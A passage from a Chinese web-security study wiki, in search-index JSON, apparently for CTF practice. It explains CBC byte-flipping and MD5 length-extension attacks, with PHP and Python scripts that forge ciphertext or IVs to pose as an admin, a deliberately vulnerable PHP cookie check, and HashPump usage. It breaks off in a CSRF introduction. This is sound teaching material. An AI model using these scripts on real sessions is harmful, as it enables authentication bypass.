<p></p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_2","title":"\u52a0\u5bc6\u8fc7\u7a0b\uff1b","text":"<p>\u9996\u5148\u5c06\u660e\u6587\u5206\u6210\u6bcfX\u4f4d\u4e00\u7ec4\uff0c\u4f4d\u6570\u4e0d\u8db3\u7684\u662f\u7528\u7279\u6b8a\u5b57\u7b26\u586b\u5145 \uff01\uff01\uff01\uff01\uff01\uff01\uff01</p> <p>X\u5e38\u89c1\u7684\u4e3a16\u4f4d\uff0c\u4e5f\u670932\u4f4d</p> <p>\u8fd9\u91cc\u8981\u6ce8\u610f\uff0cCBC\u7684\u586b\u5145\u89c4\u5219\u662f\u7f3a\u5c11N\u4f4d\uff0c\u5c31\u7528 N \u4e2a '\\xN'\u586b\u5145\uff0c\u5982\u7f3a\u5c1110\u4f4d\u5219\u7528 10 \u4e2a '\\x10'\u586b\u5145\uff08\u8fd9\u91cc\u662f\u6838\u5fc3\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\uff01\u867d\u7136\u4e0d\u662f\u8fd9\u91cc\u7684\uff09</p> <p>\u7136\u540e\u751f\u6210\u521d\u59cb\u5411\u91cfIV(\u8fd9\u91cc\u7684\u521d\u59cb\u5411\u91cf\u5982\u679c\u672a\u7279\u5b9a\u7ed9\u51fa\u5219\u968f\u673a\u751f\u6210)\u548c\u5bc6\u94a5</p> <p>\u5c06\u521d\u59cb\u5411\u91cf\u4e0e\u7b2c\u4e00\u7ec4\u660e\u6587\u5f02\u6216\u751f\u6210\u5bc6\u6587A</p> <p>\u7528\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u6587A \u5f97\u5230\u5bc6\u6587A_1</p> <p>\u91cd\u590d3 \u5c06\u5bc6\u6587A_1\u4e0e\u7b2c\u4e8c\u7ec4\u660e\u6587\u5f02\u6216\u751f\u6210\u5bc6\u6587B</p> <p>\u91cd\u590d4 \u7528\u5bc6\u94a5\u52a0\u5bc6\u5bc6\u6587B_1</p> <p>\u91cd\u590d3-6 \u76f4\u5230\u6700\u540e\u4e00\u7ec4\u660e\u6587</p> <p>\u5c06IV\u548c\u52a0\u5bc6\u540e\u7684\u5bc6\u6587\u62fc\u63a5\u5728\u4e00\u8d77\uff0c\u5f97\u5230\u6700\u7ec8\u7684\u5bc6\u6587</p> <p>\u7531\u4e8e\u662f\u5f02\u6216\uff0c\u4ece\u67d0\u79cd\u610f\u4e49\u4e0a\u662f\u4e2a\u53ef\u9006\u5f97\u5230\u8fd0\u7b97\u8fc7\u7a0b</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_3","title":"\u89e3\u5bc6\u8fc7\u7a0b\uff1b","text":"<p>\u9996\u5148\u4ece\u6700\u7ec8\u7684\u5bc6\u6587\u4e2d\u63d0\u53d6\u51faIV (IV\u4e3a\u52a0\u5bc6\u65f6\u6307\u5b9a\u7684X\u4f4d)</p> <p>\u5c06\u5bc6\u6587\u5206\u7ec4</p> <p>\u4f7f\u7528\u5bc6\u94a5\u5bf9\u7b2c\u4e00\u7ec4\u5bc6\u6587\u89e3\u5bc6\u5f97\u5230\u5bc6\u6587A\uff0c\u7136\u540e\u7528IV\u8fdb\u884c\u5f02\u6216\u5f97\u5230\u7b2c\u4e00\u7ec4\u660e\u6587</p> <p>\u4f7f\u7528\u5bc6\u94a5\u5bf9\u7b2c\u4e8c\u7ec4\u5bc6\u6587\u89e3\u5bc6\u5f97\u5230\u5bc6\u6587B\uff0c\u7136\u540e\u7528A\u4e0eB\u8fdb\u884c\u5f02\u6216\u5f97\u5230\u7b2c\u4e8c\u7ec4\u660e\u6587</p> <p>\u91cd\u590d3-4 \u76f4\u5230\u6700\u540e\u4e00\u7ec4\u5bc6\u6587</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_4","title":"\u653b\u51fb\u8fc7\u7a0b","text":"<p>\u6839\u636e\u89e3\u5bc6\u8fc7\u7a0b\uff0c\u5047\u8bbeA\u4e3a\u660e\u6587\uff0cB\u4e3a\u524d\u4e00\u7ec4\u5bc6\u6587\uff0cC\u4e3a\u5bc6\u6587\u7ecf\u8fc7\u5bc6\u94a5\u89e3\u5bc6\u4e4b\u540e\u7684\u5b57\u7b26\u4e32\uff1a</p> <p>$A = Plaintext[0] = 11 ;</p> <p>$B = Ciphertext[0] = 13 ;</p> <p>$C = Decrypt(Ciphertext)[0] = 6 ;</p> <p>\u89e3\u5bc6\u8fc7\u7a0b\u4e2d\u6211\u4eec\u662f\u7528 C\u4e0eB \u5f02\u6216\u5f97\u5230A\uff0c \u5373 C ^ B = A</p> <p>\u6839\u636e\u89e3\u5bc6\u65b9\u5f0f\u6211\u4eec\u53ef\u4ee5\u77e5\u9053</p> <p>$C ^ Old_IV= Source_str</p> <p>//\u6240\u4ee5</p> <p>$C = Old_IV^ Source_str</p> <p>//\u5e76\u4e14\u6211\u4eec\u8fd8\u9700\u8981</p> <p>$C ^ New_IV= Target_str</p> <p>//\u5373</p> <p>$C = New_IV^ Target_str</p> <p>//\u6240\u4ee5</p> <p>Old_IV ^Source_str = New_IV ^ Target_str</p> <p>//\u6240\u4ee5</p> <p>New_IV =Old_IV ^ Source_str ^ Target_str</p> <p>\u6240\u4ee5\u8bf4\u6211\u4eec\u53ea\u9700\u8981\u4fee\u6539\u524d\u4e00\u7ec4\u5bc6\u6587\u6240\u5bf9\u5e94\u7684\u672c\u7ec4\u660e\u6587\u76f8\u540c\u4f4d\u7f6e\u7684\u5b57\u7b26\uff0c\u5373\u53ef\u5f97\u5230\u60f3\u8981\u7684\u660e\u6587\u3002</p> <p>\u8fd9\u91cc\u53ef\u4ee5\u6ce8\u610f\u5230\u524d\u4e00\u5757Ciphertext\u7528\u6765\u4ea7\u751f\u4e0b\u4e00\u5757\u660e\u6587\uff0c\u5982\u679c\u6211\u4eec\u6539\u53d8\u524d\u4e00\u5757Ciphertext\u4e2d\u7684\u4e00\u4e2a\u5b57\u8282\uff0c\u7136\u540e\u548c\u4e0b\u4e00\u5757\u89e3\u5bc6\u540e\u7684\u5bc6\u6587xor\uff0c\u5c31\u53ef\u4ee5\u5f97\u5230\u4e00\u4e2a\u4e0d\u540c\u7684\u660e\u6587\uff0c\u800c\u8fd9\u4e2a\u660e\u6587\u662f\u6211\u4eec\u53ef\u4ee5\u63a7\u5236\u7684\u3002\u5229\u7528\u8fd9\u4e00\u70b9\uff0c\u6211\u4eec\u5c31\u6b3a\u9a97\u670d\u52a1\u7aef\u6216\u8005\u7ed5\u8fc7\u8fc7\u6ee4\u5668\u3002</p> <p>CBC\u7ffb\u8f6c\u5b57\u8282\u653b\u51fb_\u85af\u6761\u732b\u7684\u535a\u5ba2-CSDN\u535a\u5ba2</p> <p>CBC\u7ffb\u8f6c\u5b57\u8282\u653b\u51fbCBC\u52a0\u5bc6\u8fc7\u7a0b\uff08\u5bc6\u6587\u5206\u7ec4\u94fe\u63a5\u6a21\u5f0f\u5f02\u6216\u540e\u52a0\u5bc6\u653b\u51fb\u70b9\u4e3aIV\u6216\u8005\u52a0\u5bc6\u540e\u7684\u67d0\u6bb5\u5bc6\u6587\u6539\u7b2c\u4e00\u7ec4\u660e\u6587\u7684\u4fe1\u606f\uff0c\u9700\u8981\u66f4\u6539IVA = Plaintext[0] = 'h' ;B = IV[0] =  \u53ef\u63a7;C = Decrypt(Ciphertext)[0] = ?;//\u6240\u4ee5\u6211\u4eec\u9700\u8981\u4f2a\u9020\u4e00\u4e2a\u65b0\u7684IV\u5411\u91cf\uff0c\u4f7f\u5f97C ^ New_IV = \u6211\u4eec\u9700\u8981\u7684\u660e\u6587//\u56e0\u4e3a\u6709 C ^ Old_IV = Source_str//\u6240\u4ee5C = Old_IV ^ Source_str//\u5e76\u4e14</p> <p>https://blog.csdn.net/weixin_44843084/article/details/106736385</p> <p>\u6309\u7167\u4e2a\u4eba\u7684\u7406\u89e3\uff0c\u5c31\u662f\u5728\u6b63\u5e38\u7684CBC\u52a0\u5bc6\u8fc7\u7a0b\u4e2d\u66ff\u6362\u539f\u672c\u7684\u6587\u672c\uff0c\u6709\u70b9\u4f2a\u9020session\u7684\u5473\u9053</p>"},{"location":"web/crypto/CBC%E5%AD%97%E8%8A%82%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/#_5","title":"\u653b\u51fb\u811a\u672c","text":"<pre><code>&lt;?php\n$enc=base64_decode(\"bIpgPK29vVQosJ+smzh0pOdq7QrP3H9CN0MBfynL1eKtILs/ayew1snTYbeYSIz8rQctkAUMORS76SWQHXwuKg==\");\n$enc[13] = chr(ord($enc[13]) ^ ord(\"k\") ^ ord (\"n\"));\necho base64_encode($enc);\n?&gt;\n#####################################################################\n&lt;?php\n$enc=base64_decode(\"4quudO++PAeVPQfcFJ0bbm1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjM6IjEyMyI7fQ==\");\n$iv=base64_decode(\"TrphJjWLH37sj6+EBqh28A==\");\n$cleartext = 'a:2:{s:8:\"userna';\n$newiv = '';\nfor ($i=0;$i&lt;16;$i++){\n$newiv=$newiv.chr(ord($iv[$i]) ^ ord($enc[$i]) ^ ord ($cleartext[$i]));\n}\necho base64_encode($newiv);\n?&gt;\n\u90a3\u4e48\u8fd9\u91cc\u4e5f\u540c\u6837\u7684\u7ed9\u51fa\u4e24\u4e2a\u811a\u672c\uff1a\u7b2c\u4e00\u4e2a\u811a\u672c\u5c31\u662f\u5728\u53cd\u8f6c\u8fc7\u7a0b\u4e2d\u7684\u5b57\u7b26\u7684CBC\u653b\u51fb\uff0c\u4f46\u7531\u4e8e\u6b64\u5904\u4fee\u6539\u7b2c\u4e8c\u4e32\u5b57\u7b26\u4e32\u7684\u503c\u662f\u7531\u4fee\u6539\u7b2c\u4e00\u4e32\u5b57\u7b26\u4e32\u7ec4\u6210\u7684\uff0c\u800c\u7b2c\u4e00\u4e2a\u5b57\u7b26\u4e32\u662f\u7531\u521d\u59cb\u5411\u91cfIV\u6240\u5f97\u5230\u7684\uff0c\u56e0\u6b64\u4e5f\u8981\u76f8\u5e94\u7684\u4fee\u6539IV\u7684\u503c\u624d\u80fd\u591f\u6b63\u5e38\u7684\u5f97\u5230\u89e3\u6790\u3002\n\n\u4e0b\u9762\u518d\u653e\u4e24\u4e2apython\u7684\u811a\u672c\uff1b\n\n\nimport base64\nimport requests\nimport urllib\niv_raw='%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D'  #\u8fd9\u91cc\u586b\u5199\u7b2c\u4e00\u6b21\u8fd4\u56de\u7684iv\u503c\ncipher_raw='8WdhbPxjZy9xYAgoCeghiOUQu0ri1Y3dv7cX44MbvOfIC6zZxCbR%2FPFpeMatL5qIgT%2BYA66tIdCBpxtWsWxV9Q%3D%3D'  #\u8fd9\u91cc\u586b\u5199\u7b2c\u4e00\u6b21\u8fd4\u56de\u7684cipher\u503c\nprint \"[*]\u539f\u59cbiv\u548ccipher\"\nprint \"iv_raw:  \" + iv_raw\nprint \"cipher_raw:  \" + cipher_raw\nprint \"[*]\u5bf9cipher\u89e3\u7801\uff0c\u8fdb\u884c\u53cd\u8f6c\"\ncipher = base64.b64decode(urllib.unquote(cipher_raw))\n#a:2:{s:8:\"username\";s:5:\"zdmin\";s:8:\"password\";s:5:\"12345\"}\n#s:2:{s:8:\"userna\n#me\";s:5:\"zdmin\";\n#s:8:\"password\";s\n#:3:\"12345\";}\nxor_cipher = cipher[0:9] +  chr(ord(cipher[9]) ^ ord('z') ^ ord('a')) + cipher[10:]  #\u8bf7\u6839\u636e\u4f60\u7684\u8f93\u5165\u81ea\u884c\u66f4\u6539\uff0c\u539f\u7406\u770b\u4e0a\u9762\u7684\u4ecb\u7ecd\nxor_cipher=urllib.quote(base64.b64encode(xor_cipher))\nprint \"\u53cd\u8f6c\u540e\u7684cipher\uff1a\" + xor_cipher\n\u8fd9\u662f\u4fee\u6539\u4e32\u4e2d\u7684\n\n#######################################################################\nimport base64\nimport urllib\ncipher = 'Bc6oENSSAEPpPdv/rbqRZG1lIjtzOjU6ImFkbWluIjtzOjg6InBhc3N3b3JkIjtzOjU6IjEyMzQ1Ijt9'#\u586b\u5199\u63d0\u4ea4\u540e\u6240\u5f97\u7684\u65e0\u6cd5\u53cd\u5e8f\u5217\u5316\u5bc6\u6587\niv = '%2F8iEm4jh%2BjbgVGwlQ31ycg%3D%3D'#\u4e00\u5f00\u59cb\u63d0\u4ea4\u7684iv\n#cipher = urllib.unquote(cipher)\ncipher = base64.b64decode(cipher)\niv = base64.b64decode(urllib.unquote(iv))\nnewIv = ''\nright = 'a:2:{s:8:\"userna'#\u88ab\u635f\u574f\u524d\u6b63\u786e\u7684\u660e\u6587\nfor i in range(16):\nnewIv += chr(ord(right[i])^ord(iv[i])^ord(cipher[i])) #\u8fd9\u4e00\u6b65\u76f8\u5f53\u4e8e\u628a\u539f\u6765iv\u4e2d\u4e0d\u5339\u914d\u7684\u90e8\u5206\u4fee\u6539\u8fc7\u6765\nprint urllib.quote(base64.b64encode(newIv))\n\u8fd9\u662f\u4fee\u6539IV\u7684\nPlain Text\n</code></pre>"},{"location":"web/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/","title":"MD5\u6269\u5c55\u653b\u51fb\u4ecb\u7ecd","text":"<p>hash\u957f\u5ea6\u62d3\u5c55\u653b\u51fb</p> <p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u54c8\u5e0c\u957f\u5ea6\u6269\u5c55\u653b\u51fb(hash lengthextensionattacks)\u662f\u6307\u9488\u5bf9\u67d0\u4e9b\u5141\u8bb8\u5305\u542b\u989d\u5916\u4fe1\u606f\u7684\u52a0\u5bc6\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u624b\u6bb5\u3002\u6b21\u653b\u51fb\u9002\u7528\u4e8eMD5\u548cSHA-1\u7b49\u57fa\u4e8eMerkle\u2013Damg\u00e5rd\u6784\u9020\u7684\u7b97\u6cd5\u3002</p> <p>\u7275\u626f\u5230\u5bc6\u7801\u5b66\uff0c\u6211\u4e2a\u4eba\u5c31\u76f4\u63a5\u5f00\u642c\u4e86</p>"},{"location":"web/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#md5","title":"MD5\u6269\u5c55\u653b\u51fb\u4ecb\u7ecd","text":"<p>\u6211\u4eec\u9700\u8981\u4e86\u89e3\u4ee5\u4e0b\u51e0\u70b9md5\u52a0\u5bc6\u8fc7\u7a0b\uff1a</p> <p>MD5\u52a0\u5bc6\u8fc7\u7a0b\u4e2d512\u6bd4\u7279\uff0864\u5b57\u8282\uff09\u4e3a\u4e00\u7ec4\uff0c\u5c5e\u4e8e\u5206\u7ec4\u52a0\u5bc6\uff0c\u800c\u4e14\u5728\u8fd0\u7b97\u7684\u8fc7\u7a0b\u4e2d\uff0c\u5c06512\u6bd4\u7279\u5206\u4e3a32bit*16\u5757\uff0c\u5206\u5757\u8fd0\u7b97</p> <p>\u5173\u952e\u5229\u7528\u7684\u662fMD5\u7684\u586b\u5145\uff0c\u5bf9\u52a0\u5bc6\u7684\u5b57\u7b26\u4e32\u8fdb\u884c\u586b\u5145(\u6bd4\u7279\u7b2c\u4e00\u4f4d\u4e3a1\u5176\u4f59\u6bd4\u7279\u4e3a0)\uff0c\u4f7f\u4e4b(\u4e8c\u8fdb\u5236)\u8865\u5230448\u6a21512\u540c\u4f59\uff0c\u5373\u957f\u5ea6\u4e3a512\u7684\u500d\u6570\u51cf64\uff0c\u6700\u540e\u768464\u4f4d\u5728\u8865\u5145\u4e3a\u539f\u6765\u5b57\u7b26\u4e32\u7684\u957f\u5ea6\uff0c\u8fd9\u6837\u521a\u597d\u8865\u6ee1512\u4f4d\u7684\u500d\u6570\uff0c\u5982\u679c\u5f53\u524d\u660e\u6587\u6b63\u597d\u662f512bit\u500d\u6570\u5219\u518d\u52a0\u4e0a\u4e00\u4e2a512bit\u7684\u4e00\u7ec4\u3002 MD5\u4e0d\u7ba1\u600e\u4e48\u52a0\u5bc6\uff0c\u6bcf\u4e00\u5757\u52a0\u5bc6\u5f97\u5230\u7684\u5bc6\u6587\u4f5c\u4e3a\u4e0b\u4e00\u6b21\u52a0\u5bc6\u7684\u521d\u59cb\u5411\u91cf\u3002</p> <p>\u4e3e\u4e00\u4e2a\u4f8b\u5b50\u8bb2\u4e00\u4e0b\u5982\u4f55\u586b\u5145\uff1a\u6bd4\u5982\u5b57\u7b26\u4e32\u201cAcker\u201d \u5341\u516d\u8fdb\u52360x41636b6572\u8fd9\u91cc\u4e0e448\u6a21512\u4e0d\u540c\u4f59\uff0c\u9700\u8865\u4f4d\u6ee1\u8db3\u4e8c\u8fdb\u5236\u957f\u5ea6\u4f4d512\u7684\u500d\u6570\uff0c\u8865\u4f4d\u540e\u7684\u6570\u636e\u5982\u4e0b\uff1a</p> <pre><code>0x61646d696e8000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002800000000000000\n</code></pre> <p>\u6b64\u5904\u8865\u5145\uff1a\u4ee5\u5341\u516d\u8fdb\u5236\u8868\u793a\u4e00\u5171\u662f128\u4e2a\u5b57\u7b26\uff0c\u5341\u516d\u8fdb\u5236\u6bcf\u4e2a\u5b57\u7b26\u80fd\u591f\u8f6c\u6362\u62104\u4f4d\u4e8c\u8fdb\u5236\uff0c128*4=512\u8fd9\u5c31\u662f\u4e00\u7ec4\uff0c\u6b63\u597d\u662f512bit\u3002</p> <p></p> <p>\u4e0a\u56fe\u4e2d\u76848\u662f\u56e0\u4e3a\u8865\u4f4d\u65f6\u4e8c\u8fdb\u5236\u7b2c\u4e00\u4f4d\u8981\u88651\uff0c\u90a3\u4e481000\u8f6c\u6362\u621016\u8fdb\u5236\u5c31\u662f8.\u540e\u9762\u90fd\u8865\u4e0a0.</p> <p></p> <p>\u586b\u5145\u6570\u636e\u6700\u540e8\u5b57\u8282\u957f\u5ea6\uff0cAcker\u957f\u5ea6\u4e3a5*8=40bit\uff0c\u53c8\u56e0\u4e3a0x28=40\u6240\u4ee516\u8fdb\u5236\u663e\u793a\u4e3a28.</p> <p>\u4e3a\u4ec0\u4e48\u6570\u636e\u4f1a\u5728\u5de6\u7aef\uff1aMD5\u4e2d\u50a8\u5b58\u7684\u90fd\u662f\u5c0f\u7aef\u65b9\u5f0f\uff0c\u6bd4\u59820x12345678\uff0c\u90a3\u4e48md5\u5b58\u50a8\u987a\u5e8f\u5c31\u662f0x78563412</p>"},{"location":"web/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#md5_1","title":"MD5\u62d3\u5c55\u653b\u51fb\u6f14\u793a","text":"<p>\u4e0b\u56fe\u4e3a\u52a0\u5bc6\u6d41\u7a0b\u56fe\uff0c\u53ef\u4ee5\u66f4\u76f4\u89c2\u770b\u6e05\u695a\u6574\u4e2a\u6d41\u7a0b\u3002</p> <p></p> <p>\u9009\u4e00\u4e2a\u5b57\u7b26\u4e32\u4f8b\u5982\u201cAcker\u201dMD5\uff08\u201cAcker\u201d\uff09= dee2fb2df156f4040f893d8a10ac1034</p> <p>\u73b0\u5728\u6211\u4eec\u4e0d\u9700\u8981\u77e5\u9053\u5b57\u7b26\u4e32\u662f\u4ec0\u4e48\u3002\u53ea\u9700\u8981\u77e5\u9053\u5176\u957f\u5ea6\uff0c\u5e76\u5c06\u5b57\u7b26\u4e32\u586b\u5145\u5b8c\uff0c\u65b0\u52a0\u4e00\u4e2a\u5b57\u7b26\u4e32\u5982\uff1aaddition\uff0c\u4e4b\u524d\u5f97\u5230\u7684\u201cAcker\u201dMD5\u503c\u4f5c\u4e3a\u6700\u540e\u4e00\u5757\u52a0\u5bc6\u7684\u521d\u59cb\u5411\u91cf\uff0c\u6700\u540e\u5f97\u5230\u7684\u7ed3\u679c\u548cMD5\uff08\u201cAcker+addition\u201d\uff09\u662f\u4e00\u6837\u7684\u3002</p> <pre><code>&lt;?php \n$flag = \"flag{flag is here}\";\n$secret = \"aaaaabbbbbccccc\"; // This secret is 15 characters long for security!\n@$username = $_POST[\"username\"];\n@$password = $_POST[\"password\"];\nif (!empty($_COOKIE[\"getmein\"])) {\n    if (urldecode($username) === \"admin\" &amp;&amp; urldecode($password) != \"admin\") {\n        if ($_COOKIE[\"getmein\"] === md5($secret . urldecode($username . $password))) {\n            echo \"Congratulations! You are a registered user.\\n\";\n            die (\"The flag is \". $flag);\n        }\n        else {\n            die (\"Your cookies don't match up! STOP HACKING THIS SITE.\");\n        }\n    }\n    else {\n        die (\"You are not an admin! LEAVE.\");\n    }\n}\nsetcookie(\"sample-hash\", md5($secret . urldecode(\"admin\" . \"admin\")), time() + (60 * 60 * 24 * 7));\nif (empty($_COOKIE[\"source\"])) {\n    setcookie(\"source\", 0, time() + (60 * 60 * 24 * 7));\n}\nelse {\n    if ($_COOKIE[\"source\"] != 0) {\n        echo \"\"; // This source code is outputted here\n    }\n}\n?&gt;\n</code></pre> <p>\u9898\u76ee\u4e2d\u53ef\u4ee5\u5f97\u5230\uff1a</p> <p>$secret\u7684\u957f\u5ea615</p> <p>md5($secret.\"adminadmin\")\u7684\u503c\u4e3a571580b26c65f306376d4f64e53cb5c7</p> <p>\u4f7f\u7528hashpump\uff0c\u65b9\u6cd5\u5982\u4e0b\u56fe\uff1a</p> <p></p> <p>\u7b2c\u4e00\u884c\u662f\u4e00\u4e2a\u65b0\u7b7e\u540d\u4f5c\u4e3agetmein\u53c2\u6570\u63d0\u4ea4</p> <p>\u7b2c\u4e8c\u884c\u4f5c\u4e3apassword\u63d0\u4ea4\u5373\u53ef\u3002</p> <p></p>"},{"location":"web/crypto/MD5%E6%89%A9%E5%B1%95%E6%94%BB%E5%87%BB%E4%BB%8B%E7%BB%8D/#hashpump","title":"\u9644\uff1ahashpump","text":"<p>HashPump\u662f\u4e00\u4e2a\u501f\u52a9\u4e8eOpenSSL\u5b9e\u73b0\u4e86\u9488\u5bf9\u591a\u79cd\u6563\u5217\u51fd\u6570\u7684\u653b\u51fb\u7684\u5de5\u5177\uff0c\u652f\u6301\u9488\u5bf9MD5\u3001CRC32\u3001SHA1\u3001SHA256\u548cSHA512\u7b49\u957f\u5ea6\u6269\u5c55\u653b\u51fb\u3002\u800cMD2\u3001SHA224\u548cSHA384\u7b97\u6cd5\u4e0d\u53d7\u6b64\u653b\u51fb\u7684\u5f71\u54cd\uff0c\u56e0\u5176\u90e8\u5206\u907f\u514d\u4e86\u5bf9\u72b6\u6001\u53d8\u91cf\u7684\u8f93\u51fa\uff0c\u5e76\u4e0d\u8f93\u51fa\u5168\u90e8\u7684\u72b6\u6001\u53d8\u91cf\u3002</p> <p>\u5b89\u88c5</p> <pre><code>git clone https://github.com/bwall/HashPump\napt-get install g++ libssl-dev\ncd HashPump\nmake\nmake install\n</code></pre> <p></p> <p>\u4f7f\u7528\u65b9\u6cd5</p> <p>\u641c\u904d\u767e\u5ea6\uff0c\u65e0\u5948\u6ca1\u6709\u4ec0\u4e48\u5177\u4f53\u8bb2\u89e3\u65b9\u6cd5\u53ea\u597dhashpump -h\u5f97\u5230\u5e2e\u52a9\uff0c\u51d1\u5408\u770b\u4e00\u4e0b\u5427\u3002\u7b80\u5355\u603b\u7ed3\u4e00\u4e0b\u5c31\u662f\u77e5\u9053\u524d\u9762\u5b57\u7b26\u603b\u957f\u5ea6\uff0c\u77e5\u9053\u4e0b\u4e00\u7ec4\u8ffd\u52a0\u6570\u636e\uff0c\u7a0b\u5e8f\u5c31\u4f1a\u81ea\u52a8\u7b97\u51fa\u524d\u4e00\u7ec4\u7684\u586b\u5145\u6570\u636e\u3002</p> <pre><code>\u279c  HashPump git:(master) \u2717 hashpump -h\nHashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]\nHashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.\n-h --help          Display this message.\n-t --test          Run tests to verify each algorithm is operating properly.\n-s --signature     The signature from known message.\n-d --data          The data from the known message.\n-a --additional    The information you would like to add to the known message.\n-k --keylength     The length in bytes of the key being used to sign the original message with.\nVersion 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.\n&lt;Developed by bwall(@botnet_hunter)&gt;\n</code></pre> <p>\u539f\u7406\u80af\u5b9a\u662f\u9700\u8981\u4e86\u89e3\u7684\uff0c\u4f46\u5728\u539f\u7406\u4e86\u89e3\u4e4b\u524d\uff0c\u6211\u4e48\u4f60\u53ef\u4ee5\u5148\u501f\u52a9\u5de5\u5177\u6765\u5b8c\u6210\u7834\u8bd1\u3002</p>"},{"location":"web/csrf_ssrf_ssi/CSRF/","title":"CSRF","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>csrf\uff08Cross Site Request Forgery\uff09\u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020</p> <p>\u9ad8\u7ea7\u4e00\u70b9\u7684XSS</p> <p>\u7ad9\u662f\u901a\u8fc7cookie\u6765\u8bc6\u522b\u7528\u6237\u7684\uff0c\u5f53\u7528\u6237\u6210\u529f\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u4e4b\u540e\u6d4f\u89c8\u5668\u5c31\u4f1a\u5f97\u5230\u4e00\u4e2a\u6807\u8bc6\u5176\u8eab\u4efd\u7684cookie\uff0c\u53ea\u8981\u4e0d\u5173\u95ed\u6d4f\u89c8\u5668\u6216\u8005\u9000\u51fa\u767b\u5f55\uff0c\u4ee5\u540e\u8bbf\u95ee \u8fd9\u4e2a\u7f51\u7ad9\u4f1a\u5e26\u4e0a\u8fd9\u4e2acookie</p> <p>\u5982\u679c\u8fd9\u671f\u95f4\u6d4f\u89c8\u5668\u88ab\u4eba\u63a7\u5236\u7740\u8bf7\u6c42\u4e86\u8fd9\u4e2a\u7f51\u7ad9\u7684url\uff0c\u53ef\u80fd\u5c31\u4f1a\u6267\u884c\u4e00\u4e9b\u7528\u6237\u4e0d\u60f3\u505a\u7684\u529f\u80fd\uff08\u6bd4\u5982\u4fee\u6539\u4e2a\u4eba\u8d44\u6599\uff09</p> <p>\u8fd9\u4e2a\u8bf7\u6c42\u5e76\u4e0d\u662f\u7528\u6237\u771f\u6b63\u60f3\u53d1\u51fa\u7684\u8bf7\u6c42\uff0c\u8fd9\u5c31\u662f\u6240\u8c13\u7684&lt;\u8bf7\u6c42\u4f2a\u9020&gt;</p> <p>\u56e0\u4e3a\u8fd9\u4e9b\u8bf7\u6c42\u4e5f\u662f\u53ef\u4ee5\u4ece\u7b2c\u4e09\u65b9\u7f51\u7ad9\u63d0\u4ea4\u7684\uff0c\u6240\u4ee5\u524d\u9762\u52a0\u4e0a&lt;\u8de8\u7ad9&gt;\u4e8c\u5b57</p> <p>\u6240\u4ee5\u7ecf\u5e38XSS\u6240\u5f39\u51fa\u7684cookie\u662f\u7528\u6765\u505acsrf\u8bf7\u6c42\u4f2a\u9020\u7684\u3002</p> <p>\u6bd4\u5982\u6211\u4eec\u6253\u7b97\u653b\u51fb\u4e00\u4e2a\u5b58\u5728\u95ee\u9898\u7684Blog\uff0c\u90a3\u5c31\u5148\u53bb\u76ee\u6807Blog\u7559\u8a00\uff0c\u7559\u4e0b\u4e00\u4e2a\u7f51\u5740\uff0c\u8bf1\u5176Blog\u7684\u4e3b\u4eba\u70b9\u51fb\uff08\u5f53\u7136\uff0c\u8fd9\u662f\u4e00\u79cd\u65b9\u6cd5\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u6211\u4eec\u4e0a\u8282\u8bfe\u8bb2\u7684XSS\uff09\uff0c\u7136\u540e\u6784\u9020\u4e2aHTML\u8868\u5355\u63d0\u4ea4\u4e9b\u6570\u636e\u8fc7\u53bb\u3002</p>"},{"location":"web/csrf_ssrf_ssi/CSRF/#_1","title":"\u6f0f\u6d1e\u793a\u4f8b","text":"<p>\u4e00\u4e2a\u5178\u578b\u7684CSRF\u653b\u51fb\u6709\u7740\u5982\u4e0b\u7684\u6d41\u7a0b\uff1a</p> <p>\u53d7\u5bb3\u8005\u767b\u5f55a.com\uff0c\u5e76\u4fdd\u7559\u4e86\u767b\u5f55\u51ed\u8bc1\uff08Cookie\uff09\u3002\u653b\u51fb\u8005\u5f15\u8bf1\u53d7\u5bb3\u8005\u8bbf\u95ee\u4e86b.com\u3002b.com \u5411 a.com 